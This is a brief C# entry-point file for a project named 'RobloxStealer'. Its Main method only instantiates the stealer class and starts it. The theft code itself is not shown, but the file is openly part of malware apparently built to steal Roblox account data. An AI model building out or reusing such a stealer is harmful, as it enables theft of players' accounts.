namespace RobloxStealer
{
    internal class Program
    {
        static async Task Main()
        {
            RobloxStealer stealer = new RobloxStealer();
            await stealer.StartAsync();
        }
    }
}
